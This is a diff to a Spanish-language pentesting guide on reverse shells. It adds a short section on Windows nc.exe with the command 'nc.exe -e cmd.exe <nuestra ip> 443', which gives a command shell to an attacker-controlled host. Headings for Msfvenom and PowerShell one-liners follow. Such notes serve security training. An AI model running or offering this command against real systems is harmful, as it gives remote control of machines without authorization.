@@ -44,6 +44,14 @@ listening on [any] 443 ...
 # MANDARNOS UNA REVERSE SHELL
 ## Nc.exe
 
+Este binario es `similar a netcat` en `Linux`, pero este funciona en `Windows`, tanto en 32, como en 64 bits.
+
+Para esto usaremos el siguiente comando:
+
+```
+> nc.exe -e cmd.exe <nuestra ip> 443
+```
+
 ## Msfvenom
 
 ## Powershell Reverse Shell One-Liner
